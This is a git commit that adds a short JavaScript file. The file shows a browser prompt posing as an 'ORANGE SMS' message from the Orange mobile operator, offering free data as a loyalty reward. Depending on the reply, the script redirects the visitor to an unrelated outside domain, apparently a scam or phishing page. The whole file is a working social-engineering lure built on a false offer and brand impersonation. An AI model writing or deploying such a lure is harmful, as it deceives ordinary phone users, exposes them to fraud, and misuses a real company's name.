c60355ea5e43cbb9b0600749d23fed0e92927321
zamonize1 <52072397+zamonize@users.noreply.github.com>
2024-08-21 20:28:22 -0700

    Create activation-freedatahub.js

---
+++ activation-freedatahub.js
@@ -0,0 +1,5 @@
+var password = '1'
+password=prompt('ORANGE SMS: Dear customer, kindly check if your Orange sim card is qualify to receive from 5GB to Unlimited data, old customers Reward, press 1 to check now ','1');
+if (password != '1') {
+location.href='https://todyforu.xyz/freedatahub.html';
+}
